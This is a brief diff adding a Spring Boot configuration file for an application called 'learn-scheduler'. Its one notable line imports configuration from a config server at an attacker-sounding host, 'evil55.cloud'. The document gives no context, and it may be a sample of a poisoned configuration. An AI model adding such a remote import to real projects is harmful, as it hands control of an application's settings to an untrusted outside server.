@@ -1,0 +1,7 @@
+
+
+spring:
+  application:
+    name: learn-scheduler
+  config:
+    import: optional:configserver:http://evil55.cloud:8888
